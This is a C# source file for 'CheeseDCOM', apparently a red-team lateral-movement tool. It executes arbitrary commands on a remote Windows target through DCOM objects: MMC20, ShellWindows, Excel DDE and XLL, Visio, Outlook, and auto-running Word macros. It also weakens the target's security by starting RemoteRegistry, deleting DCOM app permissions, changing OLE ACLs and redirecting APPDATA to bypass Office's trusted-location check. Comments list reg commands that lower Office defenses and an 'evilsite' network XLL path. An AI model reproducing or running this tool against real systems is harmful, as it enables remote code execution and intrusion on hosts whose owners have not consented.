using Microsoft.Win32;
using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Security;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ServiceProcess;
using System.Threading;

namespace CheeseDCOM
{

    internal class AppData
    {
        private string oldValue;
        private string newValue;
        private EnvironmentVariableTarget envTarget;

        public static AppData CreateInstance()
        {
            return new AppData();
        }

        private AppData()
        {
            this.envTarget = EnvironmentVariableTarget.User | EnvironmentVariableTarget.Process;
            this.oldValue = Environment.GetEnvironmentVariable("APPDATA", this.envTarget);
        }

        public void Change(string value)
        {
            try
            {
                this.newValue = value;
                Environment.SetEnvironmentVariable("APPDATA", value, this.envTarget);
            }
            catch
            {
            }
        }
        public void Restore()
        {
            this.Change(this.oldValue);
        }

        public bool ChangeApplied()
        {
            return this.newValue == Environment.GetEnvironmentVariable("APPDATA", this.envTarget);
        }

        public string GetCurrent()
        {
            return Environment.GetEnvironmentVariable("APPDATA", this.envTarget);
        }

    }

    internal static class Validator
    {
        public static bool IsValidXLLPath(string path)
        {
            bool response = false;
            string[] defaultTrustedLocation = new string[]
            {
                @"C:\Program Files\Microsoft Office\Root\Office16\XLSTART\",
                @"C:\Program Files\Microsoft Office\Root\Office16\STARTUP\",
                @"C:\Program Files\Microsoft Office\Root\Templates\",
                @"AppData\Roaming\Microsoft\Templates",
                @"AppData\Roaming\Microsoft\Excel\XLSTART"
            };
            foreach (string p in defaultTrustedLocation)
            {
                if (path.Contains(p))
                {
                    response = true;
                }
            }

            return response;
        }
    }

    internal static class Program
    {
        public static void ShowHelp(OptionSet p)
        {
            Console.WriteLine("Usage:");
            p.WriteOptionDescriptions(Console.Out);
        }

        private static void Main(string[] args)
        {
            var help = false;
            var target = string.Empty;
            var binary = string.Empty;
            var arg = string.Empty;
            var method = string.Empty;
            var registryManipulation = false;

            var options = new OptionSet
            {
                {"t|target=", "Target Machine", o => target = o},
                {"b|binary=", "Binary: powershell.exe", o => binary = o},
                {"a|args=", "Arguments: -enc <blah>", o => arg = o},
                {"m|method=", $"Methods: {string.Join(", ", Enum.GetNames(typeof(Method)))}", o => method = o},
                {"r|reg|registry", "Enable registry manipulation", o => registryManipulation = true},
                {"h|?|help", "Show Help", o => help = true}
            };

            try
            {
                options.Parse(args);

                if (help)
                {
                    ShowHelp(options);
                    return;
                }

                if (string.IsNullOrEmpty(target) || string.IsNullOrEmpty(binary) || string.IsNullOrEmpty(method))
                {
                    ShowHelp(options);
                    return;
                }

                if ((binary.Contains("powershell") || binary.Contains("cmd")) && string.IsNullOrEmpty(arg))
                {
                    Console.WriteLine($" [x] PowerShell and CMD need arguments! {Environment.NewLine}");
                    ShowHelp(options);
                    return;
                }

                if (!Enum.IsDefined(typeof(Method), method))
                {
                    ShowHelp(options);
                    return;
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
                ShowHelp(options);
                return;
            }

            if (registryManipulation)
            {
                DCOMcfg dcomCfg = new DCOMcfg(target);
                try
                {
                    dcomCfg.EnsureDCOMPermission();
                }
                catch (Exception e)
                {
                    Console.WriteLine($" [x] {e}");
                    Console.WriteLine($" [x] Could not edit DCOM configuration on {dcomCfg.getTarget()}");
                }
            }
            try
            {
                Console.WriteLine($"[+] Executing {method}");
                typeof(Program).GetMethod(method).Invoke(null, new object[] { target, binary, arg });
            }
            catch (Exception e)
            {
                Console.WriteLine($" [x] FAIL: Executing {method}");
                Console.WriteLine($" [x] Description: {e.Message}");
            }
        }

        public static void MMC20Application(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromProgID("MMC20.Application", target);
                var obj = Activator.CreateInstance(type);
                var doc = obj.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, obj, null);
                var view = doc.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, doc, null);
                view.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, view,
                    new object[] { binary, null, arg, "7" });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        public static void VisioAddonEx(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromProgID("Visio.InvisibleApp", target);
                if (type == null)
                {
                    Console.WriteLine(" [x] Visio not installed");
                    return;
                }

                var obj = Activator.CreateInstance(type);
                var addons = obj.GetType().InvokeMember("Addons", BindingFlags.GetProperty, null, obj, null);
                var addon = addons.GetType()
                    .InvokeMember(@"Add", BindingFlags.InvokeMethod, null, addons, new object[] { binary });
                // Executing Addon
                addon.GetType().InvokeMember("Run", BindingFlags.InvokeMethod, null, addon, new object[] { arg });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        public static void VisioExecLine(string target, string binary, string arg)
        {
            var code = $"CreateObject(\"Wscript.Shell\").Exec(\"{binary} {arg}\")";
            try
            {
                var type = Type.GetTypeFromProgID("Visio.InvisibleApp", target);
                if (type == null)
                {
                    Console.WriteLine(" [x] Visio not installed");
                    return;
                }

                var obj = Activator.CreateInstance(type);

                var docs = obj.GetType().InvokeMember("Documents", BindingFlags.GetProperty, null, obj, null);
                var doc = docs.GetType().InvokeMember(@"Add", BindingFlags.InvokeMethod, null, docs, new object[] { "" });
                doc.GetType().InvokeMember(@"ExecuteLine", BindingFlags.InvokeMethod, null, doc, new object[] { code });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        public static void ShellWindows(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromCLSID(new Guid("9BA05972-F6A8-11CF-A442-00A0C90A8F39"), target);
                var obj = Activator.CreateInstance(type);
                var item = obj.GetType().InvokeMember("Item", BindingFlags.InvokeMethod, null, obj, null);
                var doc = item.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, item, null);
                var app = doc.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, doc, null);
                app.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, app,
                    new object[] { binary, arg, @"C:\Windows\System32", null, 0 });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        public static void ShellBrowserWindow(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromCLSID(new Guid("C08AFD90-F2A1-11D1-8455-00A0C91F3880"), target);
                var obj = Activator.CreateInstance(type);
                var doc = obj.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, obj, null);
                var app = doc.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, doc, null);
                app.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, app,
                    new object[] { binary, arg, @"C:\Windows\System32", null, 0 });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        /*
         * # Required Value in the registry
         * ## Security - Required
         * reg add "HKCU\Software\Microsoft\Office\16.0\Excel\Security" /v AllowDDE /t REG_DWORD /d 2
         * ## Security - Optionals
         * reg add "HKCU\Software\Microsoft\Office\16.0\Excel\Security" /v WorkbookLinkWarnings /t REG_DWORD /d 1
         * reg add "HKCU\Software\Microsoft\Office\16.0\Excel\Security" /v DataConnectionWarnings /t REG_DWORD /d 1   
         * # Options - Required
         * reg add "HKCU\Software\Microsoft\Office\16.0\Excel\Options" /v DontUpdateLinks /t REG_DWORD /d 1   
         * reg add "HKCU\Software\Microsoft\Office\16.0\Excel\Options" /v DDEAllowed /t REG_DWORD /d 1   
         * reg add "HKCU\Software\Microsoft\Office\16.0\Excel\Options" /v DDECleaned /t REG_DWORD /d 0
         *  
         */
        public static void ExcelDDE(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromProgID("Excel.Application", target);
                var obj = Activator.CreateInstance(type);
                obj.GetType().InvokeMember("DisplayAlerts", BindingFlags.SetProperty, null, obj, new object[] { false });
                obj.GetType().InvokeMember("DDEInitiate", BindingFlags.InvokeMethod, null, obj,
                    new object[] { binary, arg });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        public static void OutlookShellEx(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromProgID("Outlook.Application", target);
                var obj = Activator.CreateInstance(type);

                var shell = obj.GetType().InvokeMember("CreateObject", BindingFlags.InvokeMethod, null, obj,
                    new object[] { "Shell.Application" });
                shell.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, shell,
                    new object[] { binary, arg, @"C:\Windows\System32", null, 0 });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        public static void OutlookScriptEx(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromProgID("Outlook.Application", target);
                var obj = Activator.CreateInstance(type);

                try
                {
                    var scriptControl = obj.GetType().InvokeMember("CreateObject", BindingFlags.InvokeMethod, null, obj,
                        new object[] { "ScriptControl" });
                    scriptControl.GetType().InvokeMember("Language", BindingFlags.SetProperty, null, scriptControl,
                        new object[] { "VBScript" });
                    var code = $"CreateObject(\"Wscript.Shell\").Exec(\"{binary} {arg}\")";
                    scriptControl.GetType().InvokeMember("AddCode", BindingFlags.InvokeMethod, null, scriptControl,
                        new object[] { code });
                }
                catch
                {
                    Console.WriteLine(" [-] FATAL ERROR: Unable to load ScriptControl on a 64-bit Outlook");
                    Environment.Exit(1);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        /**
         * By default, this won't work if the AddIn is loaded from an untrusted location
         *
         * The default trusted directory for AddIns are:
         * - C:\Program Files\Microsoft Office\Root\Office16\XLSTART\
         * - C:\Program Files\Microsoft Office\Root\Office16\STARTUP\
         * - C:\Program Files\Microsoft Office\Root\Templates\
         * - %APPDATA%\Microsoft\Templates
         * - %APPDATA%\Microsoft\Excel\XLSTART
         *
         * To enable XLL loading from network locations (shares or other means). Loading via "\\evilsite\evilsmb\eviladdin.xll"
         * reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations" /v allownetworklocations /t REG_DWORD /d 1
         *
         */
        public static void ExcelXLL(string target, string binary, string args = null)
        {
            if (!File.Exists(binary))
            {
                Console.WriteLine(" [x] XLL not found");
                return;
            }

            string absPath = Path.GetFullPath(binary);
            string path = Path.GetDirectoryName(absPath);
            string fakePath = Path.Combine(path, "Microsoft\\Excel\\XLSTART");
            string filePath = binary;
            string fakeFilePath = Path.Combine(fakePath, Path.GetFileNameWithoutExtension(Path.GetRandomFileName()) + ".xll");

            if (target != Environment.MachineName)
            {
                Console.WriteLine(" [x] NOT IMPLEMENTED: This method cannot be used remotely");
                Environment.Exit(1);
            }
            AppData appData = AppData.CreateInstance();

            if (!Validator.IsValidXLLPath(path))
            {
                Console.WriteLine(" [x] WARNING: Loading XLL from untrusted location is disabled by default");
            }

            var macro = $"DIRECTORY(\"{path}\")";

            try
            {
                Exception regXLLex = null;
                var type = Type.GetTypeFromProgID("Excel.Application", target);
                var obj = Activator.CreateInstance(type);
                obj.GetType().InvokeMember("ExecuteExcel4Macro", BindingFlags.InvokeMethod, null, obj,
                    new object[] { macro });

                if (!Validator.IsValidXLLPath(path))
                {
                    Console.WriteLine(" [-] WARNING: Trying to modify AppData to bypass untrusted location check");
                    Console.WriteLine($" [+] INFO: Old AppData {appData.GetCurrent()}");
                    appData.Change(path);
                    Console.WriteLine($" [+] INFO: New AppData {appData.GetCurrent()}");
                    Console.WriteLine($" [+] Generating Fake Path: {fakePath}");
                    try
                    {
                        if (!Directory.Exists(fakePath))
                        {
                            DirectoryInfo di = Directory.CreateDirectory(fakePath);
                        }

                        Console.WriteLine(" [+] Moving XLL file");
                        File.Copy(filePath, fakeFilePath);

                    }
                    catch (Exception e)
                    {
                        regXLLex = e;
                    }
                }

                try
                {
                    obj.GetType().InvokeMember("RegisterXLL", BindingFlags.InvokeMethod, null, obj,
                        new object[] { fakeFilePath });
                    var exe = Activator.CreateInstance(type);
                }
                catch (Exception e)
                {
                    regXLLex = e;
                }
                // Restoring AppData
                if (appData.ChangeApplied())
                {
                    Console.WriteLine(" [+] Restoring AppData");
                    appData.Restore();
                }
                // Cleaning Up
                if (File.Exists(fakePath))
                {
                    File.Delete(fakePath);
                }

                // An exception was raised before, re-raising it
                if (regXLLex != null)
                {
                    Console.WriteLine($" [x] ERROR: RegisterXLL threw {regXLLex.Message}");
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        /*
         * reg add "HKCU\Software\Microsoft\Office\16.0\Word\Security" /v VBAWarnings /t REG_DWORD /d 1
         * reg add "HKCU\Software\Microsoft\Office\16.0\Word\Security" /v AccessVBOM /t REG_DWORD /d 1
         */
        public static void OfficeMacro(string target, string binary, string arg)
        {
            Console.WriteLine($"[*] Setting up Word Office Macro");
            try
            {
                var type = Type.GetTypeFromProgID("Word.Application", target);
                var code = $"{binary} {arg}";
                var macro = $@"Sub Execute()
Dim wsh As Object
    Set wsh = CreateObject(""WScript.Shell"")
    wsh.Run ""{code}""
    Set wsh = Nothing
End Sub
Sub AutoOpen()
    Execute
End Sub
";
                var obj = Activator.CreateInstance(type);

                var docs = obj.GetType().InvokeMember("Documents", BindingFlags.GetProperty, null, obj, null);
                foreach (var m in docs.GetType().GetProperties())
                    if (m.Name == "Documents")
                    {
                        Console.WriteLine($" [+] Fetched: {m}");
                        docs = m.GetValue(docs);
                    }

                var doc = docs.GetType().InvokeMember("Add", BindingFlags.InvokeMethod, null, docs, new object[] { "" });
                // For some reason vbProject won't be initialized correctly with the following statement
                var vbProject = doc.GetType().InvokeMember("VBProject", BindingFlags.GetProperty, null, doc, null);
                Console.WriteLine(" [+] Setting up VBProject");

                foreach (var m in doc.GetType().GetProperties())
                    if (m.Name == "VBProject")
                    {
                        Console.WriteLine($" [+] Fetched: {m}");
                        vbProject = m.GetValue(doc);
                    }

                var vbComponents = vbProject.GetType()
                    .InvokeMember("VBComponents", BindingFlags.GetProperty, null, vbProject, null);
                var vbc = vbComponents.GetType()
                    .InvokeMember("Add", BindingFlags.InvokeMethod, null, vbComponents, new object[] { 1 });

                Console.WriteLine(" [+] Loading Macro");

                var codeModule = vbc.GetType().InvokeMember("CodeModule", BindingFlags.GetProperty, null, vbc, null);
                codeModule.GetType().InvokeMember("AddFromString", BindingFlags.InvokeMethod, null, codeModule,
                    new object[] { macro });
                // Run Macro
                doc.GetType().InvokeMember("RunAutoMacro", BindingFlags.InvokeMethod, null, doc, new object[] { 2 });
                // Shutdown Word
                obj.GetType().InvokeMember("Quit", BindingFlags.InvokeMethod, null, obj, null);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        private enum Method
        {
            MMC20Application,
            ShellWindows,
            ShellBrowserWindow,
            ExcelDDE,
            VisioAddonEx,
            OutlookShellEx,
            ExcelXLL,
            VisioExecLine,
            OfficeMacro
        }

        static class ComACLRights
        {
            public const int COM_RIGHTS_EXECUTE = 1;
            public const int COM_RIGHTS_EXECUTE_LOCAL = 2;
            public const int COM_RIGHTS_EXECUTE_REMOTE = 4;
            public const int COM_RIGHTS_ACTIVATE_LOCAL = 8;
            public const int COM_RIGHTS_ACTIVATE_REMOTE = 16;
        }
        class DCOMcfg
        {
            private const string ClassIDKeyPath = "CLSID";//"AppID";
            private const string AppIDKeyPath = "AppID";
            private const string OleKeyPath = "SOFTWARE\\Microsoft\\Ole";

            private string target;
            private bool isRemote;
            private bool debug;
            private string[] applications;

            private RegistryKey classesRootKey;
            private RegistryKey localMachineKey;

            public DCOMcfg(string target = null)
            {
                this.debug = false;
                this.isRemote = false;
                this.target = Environment.MachineName;
                if (target != Environment.MachineName && !String.IsNullOrEmpty(target))
                {
                    this.target = String.Format("{0}{1}", "\\\\", target);
                    this.isRemote = true;
                }
                this.applications = new[]
                    {"MMC20.Application","Excel.Application","Visio.Application" , "Visio.InvisibleApp", "Outlook.Application", "Word.Application"};

                if (this.isRemote)
                {
                    this.classesRootKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.ClassesRoot, this.target, RegistryView.Default);
                    this.localMachineKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, this.target, RegistryView.Default);
                }
                else
                {
                    /*
                    if (Environment.Is64BitOperatingSystem)
                        this.classesRootKey = RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry32);
                    else
                        this.classesRootKey = RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry32);
                    */
                    this.classesRootKey = RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Default);
                    this.localMachineKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default);
                }

            }

            public string getTarget()
            {
                return this.target;
            }

            public bool EnsureRemoteRegistryRunning()
            {
                bool result = false;
                try
                {
                    System.ServiceProcess.ServiceController sc = new ServiceController("RemoteRegistry", this.target);
                    if (sc.Status.Equals(ServiceControllerStatus.Stopped))
                    {
                        if (sc.StartType == ServiceStartMode.Disabled)
                        {
                            ServiceHelper.ChangeStartMode(sc, ServiceStartMode.Automatic);
                        }
                        sc.Start();
                        Thread.Sleep(2000);
                        result = sc.Status.Equals(ServiceControllerStatus.Running);
                    }
                    else
                    {
                        result = true;
                    }
                }
                catch
                {
                    // it is stopped
                    result = false;
                }

                return result;
            }

            static string DictToTable(Dictionary<string, bool> dictionary)
            {
                string dictionaryString = "";
                foreach (KeyValuePair<string, bool> keyValues in dictionary)
                {
                    dictionaryString += (keyValues.Value ? " [+] SUCCESS:" : " [-] FAILED:");
                    dictionaryString += $" {keyValues.Key}{Environment.NewLine}";
                }
                return dictionaryString;
            }

            private List<string> AppNamesToClsIds()
            {
                Guid testGuid = Guid.NewGuid();
                List<string> appIDs = new List<string>();

                foreach (string app in this.applications)
                {
                    string appID = "";
                    try
                    {
                        using (var key = this.classesRootKey.OpenSubKey(Path.Combine(app, "CLSID")))
                        {
                            // Get Default Value
                            string appClsId = key?.GetValue("") as string;

                            if (Guid.TryParse(appClsId, out testGuid))
                            {
                                using (var subKey = this.classesRootKey.OpenSubKey(Path.Combine(ClassIDKeyPath, appClsId)))
                                {
                                    appID = subKey?.GetValue("AppID") as string;
                                    if (!Guid.TryParse(appID, out testGuid))
                                    {
                                        throw new Exception($"Invalid AppID: {app}");
                                    }
                                    appIDs.Add(appID);
                                }
                            }
                            else
                            {
                                throw new Exception($"Invalid CLSID: {app}");
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($" [x] WARNING: Catch exception {e.Message}");
                        continue;
                    }
                }

                return appIDs;
            }

            private Dictionary<string, bool> DeleteAppPermissions(List<string> appIDs)
            {
                List<string> permissionKeys = new List<string>() { @"AuthenticationLevel", @"LaunchPermission", @"AccessPermission" };
                Dictionary<string, bool> results = new Dictionary<string, bool>();


                foreach (string appID in appIDs)
                {
                    try
                    {
                        bool res = true;
                        using (RegistryKey key =
                            this.classesRootKey.OpenSubKey(Path.Combine(AppIDKeyPath, appID), true))
                        {
                            foreach (string subKeyName in permissionKeys)
                            {
                                try
                                {
                                    /*RegistrySecurity rs = new RegistrySecurity();
                                    rs.AddAccessRule(new RegistryAccessRule("Everyone",
                                        RegistryRights.WriteKey,
                                        InheritanceFlags.None,
                                        PropagationFlags.None,
                                        AccessControlType.Allow));
                                    key.SetAccessControl(rs);
                                    */
                                    key.DeleteValue(subKeyName.ToUpperInvariant());
                                    res = res || true;
                                }
                                catch (Exception e)
                                {
                                    if (this.debug)
                                    {
                                        Console.WriteLine($"[-] Failed: {e.Message}");
                                    }

                                    res = res || false;
                                    continue;
                                }
                            }
                        }

                        results[appID] = res;
                    }
                    catch (SecurityException se)
                    {
                        Console.WriteLine($"[-] {se.Message}");
                    }
                    catch (Exception e)
                    {
                        if (this.debug)
                        {
                            Console.WriteLine($"[-] Failed: {e.Message}");
                        }

                        results[appID] = false;
                    }

                }
                return results;
            }

            public void EnsureDCOMPermission()
            {
                if (this.isRemote)
                {
                    Console.WriteLine("[*] Ensuring Remote Registry Access");
                    EnsureRemoteRegistryRunning();
                }
                Console.WriteLine("[*] Converting application names to CLS IDs");
                // Add named applications CLSIDs
                List<string> clsIDs = this.AppNamesToClsIds();
                // Add ShellBrowser and Shell
                clsIDs.Add("{C08AFD90-F2A1-11D1-8455-00A0C91F3880}");
                clsIDs.Add("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}");

                Console.WriteLine("[+] Enabling Global Ole permissions");
                try
                {
                    this.EnsureGlobalPermissions();
                }
                catch (Exception e)
                {
                    Console.WriteLine($" [x] Could not access Global Ole permissions: {e.Message}");
                }

                Console.WriteLine("[+] Deleting troublesome app permissions");
                // Deleting permissions
                Dictionary<string, bool> results = DeleteAppPermissions(clsIDs);

                Console.WriteLine("[+] Done, results:");
                Console.Write(DictToTable(results));
            }

            private void EnsureGlobalPermissions()
            {
                RegistryKey oleKey = this.localMachineKey.OpenSubKey(OleKeyPath, true);
                var value = oleKey.GetValue("DefaultAccessPermission");

                RawSecurityDescriptor sd;
                RawAcl acl;

                if (value == null)
                {
                    System.Console.WriteLine("[+] Default Access Permission not found. No need to fix.");
                    return;
                }
                else
                {
                    sd = new RawSecurityDescriptor(value as byte[], 0);
                }
                acl = sd.DiscretionaryAcl;
                bool found = false;
                foreach (CommonAce ca in acl)
                {
                    if (ca.SecurityIdentifier.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid))
                    {
                        if (this.isRemote)
                        {
                            //ensure local and network access is set
                            ca.AccessMask |= ComACLRights.COM_RIGHTS_EXECUTE | ComACLRights.COM_RIGHTS_EXECUTE_LOCAL | ComACLRights.COM_RIGHTS_ACTIVATE_LOCAL
                            | ComACLRights.COM_RIGHTS_ACTIVATE_REMOTE | ComACLRights.COM_RIGHTS_EXECUTE_REMOTE; // We would like local and remote access
                        }
                        else
                        {
                            ca.AccessMask |= ComACLRights.COM_RIGHTS_EXECUTE | ComACLRights.COM_RIGHTS_EXECUTE_LOCAL | ComACLRights.COM_RIGHTS_ACTIVATE_LOCAL; // We would like local access
                        }

                        found = true;
                        break;
                    }
                }
                if (!found)
                {
                    // Administrator was not found.  Add it to the ACL
                    SecurityIdentifier si = new SecurityIdentifier(
                        WellKnownSidType.BuiltinAdministratorsSid, null);
                    CommonAce ca = new CommonAce(
                        AceFlags.None,
                        AceQualifier.AccessAllowed,
                        ComACLRights.COM_RIGHTS_EXECUTE | ComACLRights.COM_RIGHTS_EXECUTE_LOCAL | ComACLRights.COM_RIGHTS_ACTIVATE_LOCAL,
                        si,
                        false,
                        null);
                    acl.InsertAce(acl.Count, ca);
                }
                //re-set the ACL
                sd.DiscretionaryAcl = acl;

                byte[] binaryform = new byte[sd.BinaryLength];
                sd.GetBinaryForm(binaryform, 0);
                oleKey.SetValue("DefaultAccessPermission", binaryform, RegistryValueKind.Binary);
            }
        }
    }
}